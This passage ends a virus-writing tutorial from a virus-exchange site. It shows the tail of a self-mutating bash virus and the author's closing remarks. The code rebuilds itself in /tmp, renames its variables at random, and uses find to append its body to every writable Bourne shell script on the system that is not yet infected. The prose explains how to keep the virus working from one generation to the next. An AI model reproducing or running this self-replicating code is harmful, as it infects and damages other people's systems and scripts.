&nbsp;create_string <span style="color: #007800;">$?</span><br/>
&nbsp;<span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'# '</span><span style="color: #007800;">$mutated_string</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$body_part</span><br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>virus_piece<span style="color: #000000; font-weight: bold;">*</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary<br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>virus_piece<span style="color: #000000; font-weight: bold;">*</span><br/>
<span style="color: #c20cb9; font-weight: bold;">mv</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus<br/>
<span style="color: #000000; font-weight: bold;">for</span> variable_name <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #007800;">$variables</span>; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp;<span style="color: #007800;">mutated_string</span>=<span style="color: #ff0000;">&quot;&quot;</span><br/>
&nbsp;do_random_number <span style="color: #000000;">4</span> <span style="color: #000000;">14</span><br/>
&nbsp;create_string <span style="color: #007800;">$?</span><br/>
&nbsp;mutation <span style="color: #007800;">$variable_name</span> <span style="color: #007800;">$mutated_string</span><br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary<br/>
<span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #660033;">-type</span> f <span style="color: #660033;">-perm</span> +<span style="color: #000000;">111</span> <span style="color: #660033;">-exec</span> <span style="color: #c20cb9; font-weight: bold;">bash</span> <span style="color: #660033;">-c</span> \<br/>
<span style="color: #ff0000;">&quot;if [ -z <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`grep -s Gobleen {}\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> -a -w {} -a -n <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`file {} | grep Bourne\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> ] ; then<br/>
&nbsp;echo &gt;&gt; {}<br/>
&nbsp;cat /tmp/pure_virus &gt;&gt; {}<br/>
fi&quot;</span> \;<br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector; <span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus<br/>
<span style="color: #666666; font-style: italic;"># This comment is necessary!</span><br/>
&nbsp;</div>
<p>What i can say about this virus? We put the count of virus lines to the variable "virus_length" because of we use this number more than one time, and it is much more convenient to store it into the variable. Why we put the comment into the end of the code? Because we need to have the newline symbol there, and after erasing the comments we will have it. Without the newline symbol the virus will crash in the next generation. And last words. We put the string "#!/bin/bash" at the beginning of the file with the purposes of increasing of the reliability of a code. If the default interpreter isn't BASH (SH), without this string the file "/tmp/infector" will crash with a high probability. With this line all will be ok (at least i hope for it).</p>
<p>I hope you've understood all i haven't told about this virus.</p>
<p>Here is, i think, all i want to say in this tutorial. I consciously didn't consider prepending viruses, because of the understanding of all written above is allow to write them without a large transactions. By the way, the work with them is much easier an more pleasant, than with the appending viruses.</p>
<p>And generally, the UNIX Shell world is so polyhedral and interesting, so it is unreal to describe in one article everything, about what it would be desirable to tell, for it should be written the rather thick book, but not the article.</p>
<p>As for the possibilities and ways of development of the UNIX Shell, so, probably, it will remain by something exotic, probably not, because it is rather functional, of what i was convinced another one time, while writing the programs for this tutorial. At this words i finish this article, not telling even about 30 percents of possibilities of the UNIX Shell. If somebody will find this tutorial interesting and useful to himself, i will be very glad.</p>
<p>Thank you for spending your time for reading this article, and excuse me again for my terrible english.</p>
<p>P.S: There are all examples from this article in the enclosing archive. They are in UNIX tabulation - 1 symbol for line feed.</p>
<p>P.P.S: I want to thank people, whose sources i have looked, while learning shell script language: Quantum and SnakeByte, thank you very much!</p>
<div align="right">Gobleen Warrior//SMF 1901</div>
[<a style="" href="/lib/?lang=EN&amp;index=UN#vgw00">Back to index</a>] [<a href="/lib/vgw00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vgw00">de</a><a href="/lib/index.php?lang=en&amp;id=vgw00">en</a><a href="/lib/index.php?lang=es&amp;id=vgw00">es</a><a href="/lib/index.php?lang=it&amp;id=vgw00">it</a><a href="/lib/index.php?lang=fr&amp;id=vgw00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vgw00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vgw00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vgw00">ua</a></div>
</body>
</html>
